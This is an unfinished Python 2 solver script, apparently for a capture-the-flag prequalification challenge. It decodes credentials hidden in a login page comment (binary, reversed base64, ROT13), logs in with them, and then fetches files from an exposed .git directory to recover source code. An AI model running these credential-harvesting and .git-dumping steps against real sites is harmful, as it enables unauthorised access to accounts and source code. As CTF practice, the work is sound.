import re
import string
import requests
import json

class Solution:

    @staticmethod
    def aux_rot13(code):
        rot13 = string.maketrans(
            "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
            "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
        return string.translate(code, rot13)

    def solve(self):
        # Get the login page
        challenge_link = r"https://prequal.pwctf.com/login.php"
        challenge_session = requests.session()
        page = challenge_session.get(challenge_link, verify=False).content

        # Extract the raw data
        regex = re.compile(r"CTF\?\ (.*)\ -->")
        raw_data = regex.findall(page)

        # Convert the raw data to binary list
        binary_line = raw_data[0].replace("30", "0").replace("31", "1").replace("62", "b")
        binary_array = [binary_line[i:i + 10] for i in range(0, len(binary_line), 10)]

        # Convert the binary data to characters and reverse it
        base64_code = "".join([chr(int(c, 2)) for c in binary_array])[::-1]

        raw_decoded = base64_code.decode("base64")

        json_credentials = Solution.aux_rot13(base64_code).decode("base64")

        credentials = json.loads(json_credentials)

        post_creds = {
                'username':credentials['username'],
                'password':credentials['password']
                }

        login_response = challenge_session.post(challenge_link, data=post_creds, verify=False).content

        print login_response

        README = challenge_session.get("https://prequal.pwctf.com//readme-src/74956b12-22e0-42d4-96ae-f2da7ef2f9c6/README.md", verify=False).content

        interesting_files = ["HEAD", "config", "description", "index", "packed-refs", "info/exclude", "logs/HEAD", "objects"]
        for interesting_file in interesting_files:
            dot_git = challenge_session.get("https://prequal.pwctf.com//readme-src/74956b12-22e0-42d4-96ae-f2da7ef2f9c6/.git/{}".format(interesting_file), verify=False).content
            print interesting_file
            print dot_git

        # To be continued ...

if __name__ == '__main__':
    me = Solution()
    me.solve()
